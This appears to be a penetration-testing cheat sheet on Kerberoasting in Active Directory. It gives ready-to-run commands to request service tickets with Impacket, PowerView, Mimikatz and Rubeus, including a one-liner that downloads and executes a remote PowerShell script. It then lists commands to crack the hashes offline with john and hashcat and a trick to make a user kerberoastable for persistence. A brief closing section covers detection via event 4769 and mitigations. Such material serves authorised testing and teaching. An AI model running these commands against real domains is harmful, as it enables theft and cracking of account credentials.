# Kerberoast

## Kerberoast

The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are** **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**.  
You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.

Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

**You need valid credentials inside the domain.**

{% code title="From linux" %}
```bash
msf> use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```
{% endcode %}

{% code title="From Windows, from memory to disk" %}
```bash
Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts

#Get TGS in memory
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
 
klist #List kerberos tickets in memory
 
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```
{% endcode %}

{% code title="From Windows" %}
```bash
Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% endcode %}

### Cracking

```text
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC: `ntpdate <IP of DC>`

### Mitigation

Kerberoast is very stealthy if exploitable

* Security Event ID 4769 – A Kerberos ticket was requested
* Since 4769 is very frequent, lets filter the results:
  * Service name should not be krbtgt
  * Service name does not end with $ \(to filter out machine accounts used for services\)
  * Account name should not be machine@domain \(to filter out requests from machines\)
  * Failure code is '0x0' \(to filter out failures, 0x0 is success\)
  * Most importantly, ticket encryption type is 0x17
* Mitigation:
  * Service Account Passwords should be hard to guess \(greater than 25 characters\)
  * Use Managed Service Accounts \(Automatic change of password periodically and delegated SPN Management\)

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

**More information about Kerberoasting in ired.team in** [**here** ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**and** [**here**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

